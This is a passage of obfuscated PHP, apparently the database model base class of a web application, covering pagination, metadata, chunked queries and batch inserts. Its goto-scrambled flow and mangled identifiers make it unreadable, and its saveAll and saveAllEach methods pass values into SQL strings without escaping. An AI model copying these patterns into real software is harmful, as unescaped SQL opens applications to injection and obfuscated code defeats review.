"\x66\x75\156\x63\164\x69\x6f\x6e")); public function setDataAuto($Eˆ°™ÄöÙœ) { $this->dataAuto = $Eˆ°™ÄöÙœ; } public function __construct($B¯Øœˆñğ‘ = '', $aËªÄ¼‡ó = '', $bé¿–ø´‰° = '') { parent::__construct($B¯Øœˆñğ‘, $aËªÄ¼‡ó, $bé¿–ø´‰°); } static function textEncode($Fù²ƒø›‹) { $fÊ™Â¯¬ã =& $_SERVER[İåâé¾]; if (!$Fù²ƒø›‹) { return $fÊ™Â¯¬ã[33]; } $A«Â‰ä¹£ö = json_encode($Fù²ƒø›‹); $A«Â‰ä¹£ö = preg_replace_callback($fÊ™Â¯¬ã[344], function ($cÇãÖæ¶Ïö) { return addslashes($cÇãÖæ¶Ïö[0]); }, $A«Â‰ä¹£ö); return json_decode($A«Â‰ä¹£ö); } static function textDecode($a…²ùá×Ú) { $CÎèÊ´¾ =& $_SERVER[İåâé¾]; $DßæÉœ‚½ = json_encode($a…²ùá×Ú); $DßæÉœ‚½ = preg_replace_callback($CÎèÊ´¾[345], function ($f›¡œ°ù) { return $_SERVER[İåâé¾][92]; }, $DßæÉœ‚½); return json_decode($DßæÉœ‚½); } protected $tableMeta = array(); protected function _beforeInsert(&$BÚøÑ¡ˆºÊ, $Cë‹†¡½‡è) { $f¯‘‚›Œì‚ =& $_SERVER[İåâé¾]; if (!$this->checkDataAutoHas($f¯‘‚›Œì‚[346])) { return; } $this->dataBeforeFilter($BÚøÑ¡ˆºÊ, $f¯‘‚›Œì‚[346]); } protected function _beforeUpdate(&$A¼¶†è×“ö, $døˆÇ’®í’) { $E¾×ÇäŞ =& $_SERVER[İåâé¾]; if (!$this->checkDataAutoHas($E¾×ÇäŞ[347])) { return; } $this->dataBeforeFilter($A¼¶†è×“ö, $E¾×ÇäŞ[347]); } protected function _afterSelect(&$aê‡±ƒ³Ñ‚, $f³èÕÙÁä…) { if (!is_array($aê‡±ƒ³Ñ‚)) { return; } if (!$this->checkDataAutoHas($_SERVER[İåâé¾][348])) { return; } foreach ($aê‡±ƒ³Ñ‚ as &$cÇ›÷È öÍ) { $this->dataAfterFilter($cÇ›÷È öÍ); } } protected function _afterFind(&$Fá‰Ñîµ¯, $e¨ï×ÍĞğ) { if (!is_array($Fá‰Ñîµ¯)) { return; } if (!$this->checkDataAutoHas($_SERVER[İåâé¾][348])) { return; } $this->dataAfterFilter($Fá‰Ñîµ¯); } public function setAutoIncrement($F•‹†’´»Å) { $fº¿ğŠóÂÑ = array($this->getPk() => $F•‹†’´»Å); $D²ĞÙ¿Òãœ = $this->data($fº¿ğŠóÂÑ)->add(); if ($D²ĞÙ¿Òãœ) { $this->delete($D²ĞÙ¿Òãœ); } } public function getAutoIncrement() { $FŞŠßìÓÓ¥ = $this->getTableName(); $a¦ŠÏ×±Ş = $this->max($this->getPk()); $bÂ—‘©±…ñ = $this->query("\x73\x68\157\x77\40\164\x61\142\x6c\145\40\163\164\141\x74\165\163\x20\167\150\x65\x72\145\x20\116\x61\155\x65\x3d\47{$FŞŠßìÓÓ¥}\47"); $c™õ“—âØ½ = $bÂ—‘©±…ñ[0][$_SERVER[İåâé¾][349]]; $cß‰“ë·« = max($a¦ŠÏ×±Ş, $c™õ“—âØ½); return $cß‰“ë·«; } protected function _callBefore($Aï­‘ğŒ£ñ, $dååµô£Ù¦) { return $this->cacheCallCheck($Aï­‘ğŒ£ñ, $dååµô£Ù¦, !1); } protected function _callAfter($d×®¾ÍìÀÅ, $bëß¼¥†ø˜) { return $this->cacheCallCheck($d×®¾ÍìÀÅ, $bëß¼¥†ø˜, !0); } protected function cacheFunctionAlias($ağ‰‘ëÛïˆ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($F™ß™×ªìÔ, $B‰ø‡Ì¼ğõ, $EŞå•»‘í» = false) { $B§¸ø³ò÷ = $this->cacheFunctionAlias($B‰ø‡Ì¼ğõ); if (!$B§¸ø³ò÷) { return; } foreach ($B§¸ø³ò÷ as $c¿âœÕØÒ => $c«ô¤Æ×§î) { $E‚ù¡¼ç¯¾ = $c«ô¤Æ×§î[0]; $cäæŠí§ = explode($_SERVER[İåâé¾][47], $c«ô¤Æ×§î[1]); if ($F™ß™×ªìÔ == $c¿âœÕØÒ) { return $this->cacheFunctionGet($c¿âœÕØÒ, $E‚ù¡¼ç¯¾); } if ($EŞå•»‘í» && in_array($F™ß™×ªìÔ, $cäæŠí§)) { $this->cacheFunctionClear($c¿âœÕØÒ, $E‚ù¡¼ç¯¾); } } } public function cacheFunctionGet($a…¯¢öä¨Ø, $C×Ûç“…Ó›) { $dÌÇ¶òŒÏ = $this->cacheKeyMake($a…¯¢öä¨Ø, $C×Ûç“…Ó›); $AÚ•¨Úßîé = Cache::get($dÌÇ¶òŒÏ); if (!is_array($AÚ•¨Úßîé)) { $AÚ•¨Úßîé = call_user_func_array(array($this, $a…¯¢öä¨Ø), array($C×Ûç“…Ó›, !0)); Cache::set($dÌÇ¶òŒÏ, $AÚ•¨Úßîé); } return $AÚ•¨Úßîé; } public function cacheFunctionClear($aÖİºšöˆĞ, $D¿Ê¸åÆ÷°) { $Cñ“Ïñò’ = $D¿Ê¸åÆ÷°; if (!is_array($D¿Ê¸åÆ÷°)) { $Cñ“Ïñò’ = array($D¿Ê¸åÆ÷°); } foreach ($Cñ“Ïñò’ as $FŠ÷·šŸÖ¡) { $e·†Ş˜õ›İ = $this->cacheKeyMake($aÖİºšöˆĞ, $FŠ÷·šŸÖ¡); Cache::remove($e·†Ş˜õ›İ); } } private function cacheKeyMake($a’Æ‰”Éëó, $E£¤Ã¬ÒÖ) { $Dêğ°½¿„Ø =& $_SERVER[İåâé¾]; return get_class($this) . $Dêğ°½¿„Ø[71] . $a’Æ‰”Éëó . $Dêğ°½¿„Ø[350] . $E£¤Ã¬ÒÖ; } protected function selectPage($F‚Æ½¸®é = 200, $BàÀï“¨ñÂ = 1) { goto bÚ¥ßÚ¼×¡; D«…ª‹ÔŒ°: $F‚Æ½¸®é = intval(isset($in[$AƒèğŞùø[351]]) ? $in[$AƒèğŞùø[351]] : $F‚Æ½¸®é); $F‚Æ½¸®é = $F‚Æ½¸®é <= 5 ? 5 : ($F‚Æ½¸®é >= $D‰ÏÁÓ¤„İ ? $D‰ÏÁÓ¤„İ : $F‚Æ½¸®é); $D×ë£ò‡ƒ» = ceil($D£Š‡¸…Û / $F‚Æ½¸®é); goto Dœó‚ï³‰; CÎ½è°†Ë: $FÇÈ¥ó×‚¨[$AƒèğŞùø[352]] = array(); $this->optionsValue($FÇÈ¥ó×‚¨); $D£Š‡¸…Û = intval($this->count()); goto D«…ª‹ÔŒ°; bÚ¥ßÚ¼×¡: $AƒèğŞùø =& $_SERVER[İåâé¾]; global $in; $b‡Ãİ£‡øµ = $this->optionsValue(); goto a–Ñ†¶œàÍ; Dœó‚ï³‰: $BàÀï“¨ñÂ = intval(isset($in[$AƒèğŞùø[342]]) ? $in[$AƒèğŞùø[342]] : $BàÀï“¨ñÂ); $BàÀï“¨ñÂ = $BàÀï“¨ñÂ <= 1 ? 1 : ($BàÀï“¨ñÂ >= $D×ë£ò‡ƒ» ? $D×ë£ò‡ƒ» : $BàÀï“¨ñÂ); $this->optionsValue($b‡Ãİ£‡øµ); goto f“Ş¨íĞÜ†; fŒõ×ƒôñ: return $B™ŠŠÁ¹«; goto AßÚÁ›©“ˆ; a–Ñ†¶œàÍ: $D‰ÏÁÓ¤„İ = 4000; if ($F‚Æ½¸®é === -1) { unset($in[$AƒèğŞùø[351]]); $D‰ÏÁÓ¤„İ = 100000000; $F‚Æ½¸®é = $D‰ÏÁÓ¤„İ; } $FÇÈ¥ó×‚¨ = $b‡Ãİ£‡øµ; goto CÎ½è°†Ë; f“Ş¨íĞÜ†: $aƒÀÎ˜³ìì = $this->page($BàÀï“¨ñÂ, $F‚Æ½¸®é)->select(); if ($D×ë£ò‡ƒ» == 1) { $D£Š‡¸…Û = count($aƒÀÎ˜³ìì); } $B™ŠŠÁ¹« = array($AƒèğŞùø[353] => array($AƒèğŞùø[354] => $D£Š‡¸…Û, $AƒèğŞùø[351] => $F‚Æ½¸®é, $AƒèğŞùø[342] => $BàÀï“¨ñÂ, $AƒèğŞùø[355] => $D×ë£ò‡ƒ»), $AƒèğŞùø[356] => $aƒÀÎ˜³ìì ? $aƒÀÎ˜³ìì : array()); goto fŒõ×ƒôñ; AßÚÁ›©“ˆ: } protected function metaSet($CªÂùª‰Ñ, $F²µ¢ùÀ¾ö = null, $eÜ‹èš¯¸² = null) { goto d÷¼£Ù×ò; d÷¼£Ù×ò: $CŞèÏ–… =& $_SERVER[İåâé¾]; if (!$this->tableMeta) { return !1; } $då‹™µ°µ— = $this->tableMeta[$CŞèÏ–…[357]]; goto D§«õŞÛÒ†; e‘ÑĞÎÙÙ‹: if (is_null($F²µ¢ùÀ¾ö)) { return $c¦ŠØõ™Ÿ³->where(array($då‹™µ°µ— => $CªÂùª‰Ñ))->delete(); } if (is_null($eÜ‹èš¯¸²)) { return $c¦ŠØõ™Ÿ³->where($CµªÎŠ¸Òš)->delete(); } $Bè£… ›Ğİ = !1; goto C¿”ˆğÁÑÆ; D§«õŞÛÒ†: $c¦ŠØõ™Ÿ³ = Model($this->tableMeta[$CŞèÏ–…[358]]); if (is_array($F²µ¢ùÀ¾ö)) { $a†¶œé­é = array(); foreach ($F²µ¢ùÀ¾ö as $aÅ¸øÆîÈ• => $C’Œš¸Â½Ì) { $a†¶œé­é[] = array($då‹™µ°µ— => $CªÂùª‰Ñ, $CŞèÏ–…[88] => $aÅ¸øÆîÈ•, $CŞèÏ–…[359] => $C’Œš¸Â½Ì); } $c¦ŠØõ™Ÿ³->where(array($då‹™µ°µ— => $CªÂùª‰Ñ))->addAll($a†¶œé­é, array(), !0); return !0; } $CµªÎŠ¸Òš = array($då‹™µ°µ— => $CªÂùª‰Ñ, $CŞèÏ–…[360] => $F²µ¢ùÀ¾ö); goto e‘ÑĞÎÙÙ‹; C¿”ˆğÁÑÆ: if ($c¦ŠØõ™Ÿ³->where($CµªÎŠ¸Òš)->find()) { $Bè£… ›Ğİ = $c¦ŠØõ™Ÿ³->where($CµªÎŠ¸Òš)->save(array($CŞèÏ–…[361] => $eÜ‹èš¯¸²)); } else { $CµªÎŠ¸Òš[$CŞèÏ–…[359]] = $eÜ‹èš¯¸²; $Bè£… ›Ğİ = $c¦ŠØõ™Ÿ³->add($CµªÎŠ¸Òš); } return $Bè£… ›Ğİ; goto fŒË‡³ê©Œ; fŒË‡³ê©Œ: } public function metaGet($cÚŸ”àÖˆ¯) { goto C—â ±ÏÉç; bîÔÅÀ¼„Ö: $dÚÖ©™¤° = Model($this->tableMeta[$Bæ”ùÄçÂ†[358]]); $CÔ¬Ã•Œ = array($CÁŒÚŞäÉ¡ => $cÚŸ”àÖˆ¯); $döñ¬‘ƒ’ = $dÚÖ©™¤°->field($Bæ”ùÄçÂ†[362])->where($CÔ¬Ã•Œ)->select(); goto d­ñˆÙÊÒ°; C—â ±ÏÉç: $Bæ”ùÄçÂ† =& $_SERVER[İåâé¾]; if (!$this->tableMeta) { return array(); } $CÁŒÚŞäÉ¡ = $this->tableMeta[$Bæ”ùÄçÂ†[357]]; goto bîÔÅÀ¼„Ö; d­ñˆÙÊÒ°: $döñ¬‘ƒ’ = array_to_keyvalue($döñ¬‘ƒ’, $Bæ”ùÄçÂ†[88], $Bæ”ùÄçÂ†[359]); return $döñ¬‘ƒ’; goto CÈã¡ÎùÏ¿; CÈã¡ÎùÏ¿: } private function checkDataAutoHas($E­ ¡Õ¥•©) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $F“ùÉèö‹«) { if (in_array($E­ ¡Õ¥•©, explode($_SERVER[İåâé¾][47], $F“ùÉèö‹«[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$e…Ü«áè¤Ø, $A°Û›¥ Õ”) { $EŸã†‚ôñğ =& $_SERVER[İåâé¾]; foreach ($this->dataAuto as $fö“çìŸŠù) { $DÌÀè±Â³î = $fö“çìŸŠù[0]; if (!in_array($A°Û›¥ Õ”, explode($EŸã†‚ôñğ[47], $fö“çìŸŠù[2]))) { continue; } switch (trim($fö“çìŸŠù[3])) { case $EŸã†‚ôñğ[312]: case $EŸã†‚ôñğ[313]: $fÛ©„¾”æ“ = $fö“çìŸŠù[1]; $dÈ—Œ¥¨Ğ‰ = isset($fö“çìŸŠù[4]) ? (array) $fö“çìŸŠù[4] : array(); if ($fÛ©„¾”æ“ == $EŸã†‚ôñğ[189] && array_key_exists($DÌÀè±Â³î, $e…Ü«áè¤Ø)) { if (!$e…Ü«áè¤Ø[$DÌÀè±Â³î]) { unset($e…Ü«áè¤Ø[$DÌÀè±Â³î]); } break; } if (isset($e…Ü«áè¤Ø[$DÌÀè±Â³î])) { array_unshift($dÈ—Œ¥¨Ğ‰, $e…Ü«áè¤Ø[$DÌÀè±Â³î]); } if ($EŸã†‚ôñğ[312] == $fö“çìŸŠù[3]) { $e…Ü«áè¤Ø[$DÌÀè±Â³î] = call_user_func_array($fÛ©„¾”æ“, $dÈ—Œ¥¨Ğ‰); } else { $e…Ü«áè¤Ø[$DÌÀè±Â³î] = call_user_func_array(array(&$this, $fÛ©„¾”æ“), $dÈ—Œ¥¨Ğ‰); } break; case $EŸã†‚ôñğ[264]: $e…Ü«áè¤Ø[$DÌÀè±Â³î] = $e…Ü«áè¤Ø[$fö“çìŸŠù[1]]; break; case $EŸã†‚ôñğ[285]: if (isset($e…Ü«áè¤Ø[$DÌÀè±Â³î]) && !is_string($e…Ü«áè¤Ø[$DÌÀè±Â³î])) { $e…Ü«áè¤Ø[$DÌÀè±Â³î] = json_encode_force($e…Ü«áè¤Ø[$DÌÀè±Â³î]); } break; case $EŸã†‚ôñğ[314]: if ($e…Ü«áè¤Ø[$DÌÀè±Â³î] === $EŸã†‚ôñğ[33]) { unset($e…Ü«áè¤Ø[$DÌÀè±Â³î]); } break; case $EŸã†‚ôñğ[315]: $e…Ü«áè¤Ø[$DÌÀè±Â³î] = $fö“çìŸŠù[1]; default: break; } } if ($A°Û›¥ Õ” == $EŸã†‚ôñğ[346]) { $E³×µÂ¼… = strtolower($this->db->getDbType()); if (strpos($E³×µÂ¼…, $EŸã†‚ôñğ[9]) !== 0) { return; } $eë¢ØÉöœ = $this->field(!0)->fields; $AÊòç¥¾ = $eë¢ØÉöœ[$EŸã†‚ôñğ[243]]; if (isset($eë¢ØÉöœ[$EŸã†‚ôñğ[242]])) { unset($AÊòç¥¾[$eë¢ØÉöœ[$EŸã†‚ôñğ[242]]]); } foreach ($AÊòç¥¾ as $EÕ¦—Òó›š => $A°Û›¥ Õ”) { if (!isset($e…Ü«áè¤Ø[$EÕ¦—Òó›š])) { $e…Ü«áè¤Ø[$EÕ¦—Òó›š] = $EŸã†‚ôñğ[33]; } } } } private function dataAfterFilter(&$fµêå²›Œ) { $EÎÊñµ—æ‰ =& $_SERVER[İåâé¾]; foreach ($this->dataAuto as $F¬¾Ÿ„Â±İ) { $FÔÀİ‹¬¿¤ = $F¬¾Ÿ„Â±İ[0]; if (!in_array($EÎÊñµ—æ‰[348], explode($EÎÊñµ—æ‰[47], $F¬¾Ÿ„Â±İ[2]))) { continue; } if (!isset($fµêå²›Œ[$FÔÀİ‹¬¿¤])) { continue; } switch (trim($F¬¾Ÿ„Â±İ[3])) { case $EÎÊñµ—æ‰[312]: case $EÎÊñµ—æ‰[313]: $E‚À¿¼‰ = isset($F¬¾Ÿ„Â±İ[4]) ? (array) $F¬¾Ÿ„Â±İ[4] : array(); array_unshift($E‚À¿¼‰, $fµêå²›Œ[$FÔÀİ‹¬¿¤]); if ($EÎÊñµ—æ‰[312] == $F¬¾Ÿ„Â±İ[3]) { $fµêå²›Œ[$FÔÀİ‹¬¿¤] = call_user_func_array($F¬¾Ÿ„Â±İ[1], $E‚À¿¼‰); } else { $fµêå²›Œ[$FÔÀİ‹¬¿¤] = call_user_func_array(array(&$this, $F¬¾Ÿ„Â±İ[1]), $E‚À¿¼‰); } break; case $EÎÊñµ—æ‰[264]: $fµêå²›Œ[$FÔÀİ‹¬¿¤] = $fµêå²›Œ[$F¬¾Ÿ„Â±İ[1]]; break; case $EÎÊñµ—æ‰[285]: $e«¥óøÈĞù = $fµêå²›Œ[$FÔÀİ‹¬¿¤]; $fµêå²›Œ[$FÔÀİ‹¬¿¤] = json_decode($e«¥óøÈĞù, !0); if (is_null($fµêå²›Œ[$FÔÀİ‹¬¿¤])) { $fµêå²›Œ[$FÔÀİ‹¬¿¤] = $e«¥óøÈĞù; } break; case $EÎÊñµ—æ‰[314]: if ($fµêå²›Œ[$FÔÀİ‹¬¿¤] === $EÎÊñµ—æ‰[33]) { unset($fµêå²›Œ[$FÔÀİ‹¬¿¤]); } break; case $EÎÊñµ—æ‰[315]: $fµêå²›Œ[$FÔÀİ‹¬¿¤] = $F¬¾Ÿ„Â±İ[1]; default: break; } } } public function saveAll($dì²ó±›ÂÂ) { goto CÆš‚ªèšê; AºÚÎ¯Ä½©: $e« ¤¥ï‰Ø = $a£ˆŒ¾Æ…²[363]; $eá ÇÜ÷–‹ = 0; $DÂˆ½š´ç‚ = array(); goto bÚĞƒ«‘¹µ; CÆš‚ªèšê: $a£ˆŒ¾Æ…² =& $_SERVER[İåâé¾]; $d¤×Âœ‚Š = $this->tablePrefix . $this->tableName; $Dğà‰‡á¹õ = self::SQL_WHERE_IN_CHUNK; goto AºÚÎ¯Ä½©; bÚĞƒ«‘¹µ: $cµ©‡å¬‰Á = count($dì²ó±›ÂÂ); for ($a”Ñ«¼ÆÖ· = 0; $a”Ñ«¼ÆÖ· < $cµ©‡å¬‰Á; $a”Ñ«¼ÆÖ·++) { $C‘ğòà¶± = $dì²ó±›ÂÂ[$a”Ñ«¼ÆÖ·]; if (!is_array($C‘ğòà¶±) || count($C‘ğòà¶±) != 4) { continue; } $AµèÑ…­ö = "\x55\120\104\101\124\x45\40{$d¤×Âœ‚Š}\x20\x53\105\x54\40{$C‘ğòà¶±[2]}\40\75\x20\103\101\x53\x45\x20{$C‘ğòà¶±[0]}\x20\xa"; if ($eá ÇÜ÷–‹ == 0) { $e« ¤¥ï‰Ø = $AµèÑ…­ö; } $DÂˆ½š´ç‚[] = $a£ˆŒ¾Æ…²[111] . $C‘ğòà¶±[1] . $a£ˆŒ¾Æ…²[111]; $eá ÇÜ÷–‹++; $e« ¤¥ï‰Ø .= "\40\127\110\x45\116\40\47{$C‘ğòà¶±[1]}\x27\x20\124\110\105\x4e\40\x27{$C‘ğòà¶±[3]}\x27\40\xa"; if ($eá ÇÜ÷–‹ == $Dğà‰‡á¹õ || $a”Ñ«¼ÆÖ· == $cµ©‡å¬‰Á - 1) { $aƒŸ‘•Ë¯â = implode($a£ˆŒ¾Æ…²[47], $DÂˆ½š´ç‚); $e« ¤¥ï‰Ø .= "\x20\x45\116\x44\40\x20\x57\x48\x45\x52\105\40{$C‘ğòà¶±[0]}\40\111\116\40\x28{$aƒŸ‘•Ë¯â}\x29\40"; $this->execute($e« ¤¥ï‰Ø); $eá ÇÜ÷–‹ = 0; $e« ¤¥ï‰Ø = $AµèÑ…­ö; $DÂˆ½š´ç‚ = array(); } } goto F¢¦èòà‹; F¢¦èòà‹: } public function saveAllEach($cîã…Œä¸¬) { $Aæ‡Â…³ŠÎ =& $_SERVER[İåâé¾]; $EÖÆ×ÇåŠ = $this->tablePrefix . $this->tableName; foreach ($cîã…Œä¸¬ as $a ÓÌ°Ş) { if (!is_array($a ÓÌ°Ş) || count($a ÓÌ°Ş) != 4) { continue; } $dã ïŠ¹¤Ë = $a ÓÌ°Ş[0] . $Aæ‡Â…³ŠÎ[364] . $a ÓÌ°Ş[1] . $Aæ‡Â…³ŠÎ[111]; $b–ëŒÌÁ•Ÿ = $a ÓÌ°Ş[2] . $Aæ‡Â…³ŠÎ[364] . $a ÓÌ°Ş[3] . $Aæ‡Â…³ŠÎ[111]; $Cêßƒ•²–¹ = "\165\x70\x64\141\x74\145\40{$EÖÆ×ÇåŠ}\40\163\x65\x74\x20{$b–ëŒÌÁ•Ÿ}\40\x77\x68\x65\162\x65\40{$dã ïŠ¹¤Ë}\73"; $this->execute($Cêßƒ•²–¹); } } public function addAll($C¹ºàƒéñ­, $eìÒ—ğä = array(), $cŠ¸÷£¬áÄ = false) { goto AïÇí¬±Ã‹; AïÇí¬±Ã‹: $Cá£‹ñš¼¢ =& $_SERVER[İåâé¾]; ignore_timeout(); $FÊ¶¦—‘ê = self::SQL_WHERE_IN_CHUNK; goto dĞ¦èš†§ƒ; Fæà–‰ÂÖ: if (method_exists($this->db, $Cá£‹ñš¼¢[263])) { for ($DóöÜ®ØĞ = 0; $DóöÜ®ØĞ < count($C¹ºàƒéñ­); $DóöÜ®ØĞ += $FÊ¶¦—‘ê) { $E·£Æğ§‰¾ = array_slice($C¹ºàƒéñ­, $DóöÜ®ØĞ, $FÊ¶¦—‘ê); if (!is_array($E·£Æğ§‰¾) || count($E·£Æğ§‰¾) == 0) { break; } $bƒğÒĞ›‡Ë = $this->db->insertAll($E·£Æğ§‰¾, $eìÒ—ğä, $cŠ¸÷£¬áÄ); } } else { $this->startTrans(); foreach ($C¹ºàƒéñ­ as $a£‘»‚ ‹ˆ => $B¥¹¹Ä‘Ë‹) { $bƒğÒĞ›‡Ë = $this->db->insert($B¥¹¹Ä‘Ë‹, $eìÒ—ğä, $cŠ¸÷£¬áÄ); } $this->commit(); } if (!1 !== $bƒğÒĞ›‡Ë) { $f×·ÁÃ©ãÂ = $this->getLastInsID(); if ($f×·ÁÃ©ãÂ) { return $f×·ÁÃ©ãÂ; } } return $bƒğÒĞ›‡Ë; goto CÈ£Ÿ¶ÅÔÚ; dĞ¦èš†§ƒ: if (empty($C¹ºàƒéñ­)) { $this->error = think_lang($Cá£‹ñš¼¢[262]); return !1; } $eìÒ—ğä = $this->_parseOptions($eìÒ—ğä); foreach ($C¹ºàƒéñ­ as $a£‘»‚ ‹ˆ => $B¥¹¹Ä‘Ë‹) { $C¹ºàƒéñ­[$a£‘»‚ ‹ˆ] = $this->_facade($B¥¹¹Ä‘Ë‹); $this->_beforeInsert($C¹ºàƒéñ­[$a£‘»‚ ‹ˆ], $eìÒ—ğä); } goto Fæà–‰ÂÖ; CÈ£Ÿ¶ÅÔÚ: } public function save($A’¬¼Ìì¥ = '', $dÌœ©²²ó = array()) { goto aŠ”¶Û‘•‚; F½çº‘¥¢Š: $aá…¯åÚ„Ê = $this->findWhereField($bŠÁ‘¥Ëî¢); if (!$aá…¯åÚ„Ê) { return parent::save($A’¬¼Ìì¥, $dÌœ©²²ó); } $E‡í¤£÷ºñ = 0; goto eŞ¹ª“¿ÑŸ; FÛ³Ù‹ÑÏö: return $E‡í¤£÷ºñ; goto cÄ÷øÄÎ; aŠ”¶Û‘•‚: $A¢íõšŒ„Ş =& $_SERVER[İåâé¾]; $f‡ƒë¯ = self::SQL_WHERE_IN_CHUNK; $bŠÁ‘¥Ëî¢ = $this->optionsValue(); goto F½çº‘¥¢Š; eŞ¹ª“¿ÑŸ: $eôìĞ™†ã– = $bŠÁ‘¥Ëî¢[$A¢íõšŒ„Ş[266]][$aá…¯åÚ„Ê][1]; $c„«áöèÇ• = count($eôìĞ™†ã–); for ($aáÒõ‡Ó¤ = 0; $aáÒõ‡Ó¤ < $c„«áöèÇ•; $aáÒõ‡Ó¤ += $f‡ƒë¯) { $DŒë¾·™ÖÄ = array_slice($eôìĞ™†ã–, $aáÒõ‡Ó¤, $f‡ƒë¯); if (!is_array($DŒë¾·™ÖÄ) || count($DŒë¾·™ÖÄ) == 0) { break; } $bŠÁ‘¥Ëî¢[$A¢íõšŒ„Ş[266]][$aá…¯åÚ„Ê][1] = $DŒë¾·™ÖÄ; $this->optionsValue($bŠÁ‘¥Ëî¢); $E‡í¤£÷ºñ += parent::save($A’¬¼Ìì¥, $dÌœ©²²ó); } goto FÛ³Ù‹ÑÏö; cÄ÷øÄÎ: } public function add($aÙòÈŠÍ× = '', $a§ËËÌ‰ = array(), $a‹ ‚ãº»× = false) { if ($this->addTaskStatus && is_array($aÙòÈŠÍ×)) { $this->addTaskData[] = $aÙòÈŠÍ×; return; } return parent::add($aÙòÈŠÍ×, $a§ËËÌ‰, $a‹ ‚ãº»×); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($E½Î¸’ï¨ = array()) { goto aòÙÕä¤«Ø; aòÙÕä¤«Ø: $cÚˆÁÙÑ‚ =& $_SERVER[İåâé¾]; $eÆ™÷ÅÈÏõ = self::SQL_WHERE_IN_CHUNK; $B¹ÄÕÇ›Í = $this->optionsValue(); goto d·Ä˜–ğ§; d·Ä˜–ğ§: $CÓØ…Úñ‹ = $this->findWhereField($B¹ÄÕÇ›Í); if (!$CÓØ…Úñ‹ || isset($B¹ÄÕÇ›Í[$cÚˆÁÙÑ‚[283]]) || isset($B¹ÄÕÇ›Í[$cÚˆÁÙÑ‚[342]])) { return parent::select($E½Î¸’ï¨); } $c»Ğ‰Ã©­” = $B¹ÄÕÇ›Í[$cÚˆÁÙÑ‚[266]][$CÓØ…Úñ‹][1]; goto A¦Ç¯‡¿; A¦Ç¯‡¿: $FºÊí®›Ç = null; for ($f¸‡Ÿß¸²¨ = 0; $f¸‡Ÿß¸²¨ < count($c»Ğ‰Ã©­”); $f¸‡Ÿß¸²¨ += $eÆ™÷ÅÈÏõ) { $C¬¥…ó£ö‘ = array_slice($c»Ğ‰Ã©­”, $f¸‡Ÿß¸²¨, $eÆ™÷ÅÈÏõ); if (!is_array($C¬¥…ó£ö‘) || count($C¬¥…ó£ö‘) == 0) { break; } $B¹ÄÕÇ›Í[$cÚˆÁÙÑ‚[266]][$CÓØ…Úñ‹][1] = $C¬¥…ó£ö‘; $this->optionsValue($B¹ÄÕÇ›Í); $B©â•·½ƒİ = parent::select($E½Î¸’ï¨); if (!$B©â•·½ƒİ) { continue; } if (is_null($FºÊí®›Ç)) { $FºÊí®›Ç = array(); } $FºÊí®›Ç = array_merge($FºÊí®›Ç, $B©â•·½ƒİ); } return $FºÊí®›Ç; goto aæ Ê±ÒÇØ; aæ Ê±ÒÇØ: } public function delete($fÁ£áØ…ßå = array()) { goto f›Úö£ø÷; f›Úö£ø÷: $fˆ“±ÔÖâÌ =& $_SERVER[İåâé¾]; $bÌ®ÚÙ…Ğ = self::SQL_WHERE_IN_CHUNK; $Aß—ªœƒ³ˆ = $this->optionsValue(); goto fƒÀÓ—òš®; Aóù¸˜¼ğª: $CğÉÓÎëÉõ = $Aß—ªœƒ³ˆ[$fˆ“±ÔÖâÌ[266]][$F³´×ææ·][1]; for ($e³‹¢åà¸« = 0; $e³‹¢åà¸« < count($CğÉÓÎëÉõ); $e³‹¢åà¸« += $bÌ®ÚÙ…Ğ) { $fÖÕÕ¯·Ú© = array_slice($CğÉÓÎëÉõ, $e³‹¢åà¸«, $bÌ®ÚÙ…Ğ); if (!is_array($fÖÕÕ¯·Ú©) || count($fÖÕÕ¯·Ú©) == 0) { break; } $Aß—ªœƒ³ˆ[$fˆ“±ÔÖâÌ[266]][$F³´×ææ·][1] = $fÖÕÕ¯·Ú©; $this->optionsValue($Aß—ªœƒ³ˆ); $b˜ŸÙ¾ƒÙ += parent::delete($fÁ£áØ…ßå); } return $b˜ŸÙ¾ƒÙ; goto BÔãÚ÷Ô£æ; fƒÀÓ—òš®: $F³´×ææ· = $this->findWhereField($Aß—ªœƒ³ˆ); if (!$F³´×ææ·) { return parent::delete($fÁ£áØ…ßå); } $b˜ŸÙ¾ƒÙ = 0; goto Aóù¸˜¼ğª; BÔãÚ÷Ô£æ: } private function findWhereField($Cö÷¬Š»à†) { $D±šÊÙÜ‰ =& $_SERVER[İåâé¾]; $fË‚½ÜÜ = self::SQL_WHERE_IN_CHUNK; if (!is_array($Cö÷¬Š»à†) || !is_array($Cö÷¬Š»à†[$D±šÊÙÜ‰[266]])) { return !1; } foreach ($Cö÷¬Š»à†[$D±šÊÙÜ‰[266]] as $DÕîø²‹‡ => $eà¯©…ªœö) { if (is_array($eà¯©…ªœö) && isset($eà¯©…ªœö[0]) && is_string($eà¯©…ªœö[0]) && strtolower($eà¯©…ªœö[0]) == $D±šÊÙÜ‰[7] && is_array($eà¯©…ªœö[1]) && count($eà¯©…ªœö[1]) > $fË‚½ÜÜ) { ignore_timeout(); return $DÕîø²‹‡; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\x65\155\117\160\164\151\x6f\156"; public $field = array(); public function listData($båÅÖÉñº = false, $dÀÛªÛ¡ƒŠ = "\155\157\x64\x69\146\x79\124\x69\155\145", $c¶¼È°–³‚ = false) { $Bº“Ûó®Ì‰ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$båÅÖÉñº) { $Bº“Ûó®Ì‰ = array_filter(array_values($Bº“Ûó®Ì‰)); return array_sort_by($Bº“Ûó®Ì‰, $dÀÛªÛ¡ƒŠ, $c¶¼È°–³‚); } return $Bº“Ûó®Ì‰[$_SERVER[İåâé¾][365] . $båÅÖÉñº]; } public function insert($fœ¥—Äïëù) { goto Bšø›ê; Bšø›ê: $cˆ¸÷å¹èç =& $_SERVER[İåâé¾]; $fœ¥—Äïëù = array_field_key($fœ¥—Äïëù, $this->field); $F˜ËÄØÉ¢Ü = Model($this->modelType)->get($cˆ¸÷å¹èç[366], $this->optionType . $cˆ¸÷å¹èç[367]); goto 